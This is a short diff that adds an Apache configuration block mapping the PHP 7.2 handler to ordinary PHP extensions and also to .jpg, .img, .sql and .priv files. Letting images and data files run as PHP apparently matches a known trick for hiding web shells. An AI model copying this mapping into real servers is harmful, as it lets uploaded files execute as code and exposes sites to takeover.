@@ -1,0 +1,3 @@
+<IfModule mime_module> 
+  AddHandler application/x-httpd-ea-php72 .priv .sql .img .jpg .php .php7 .phtml 
+</IfModule>
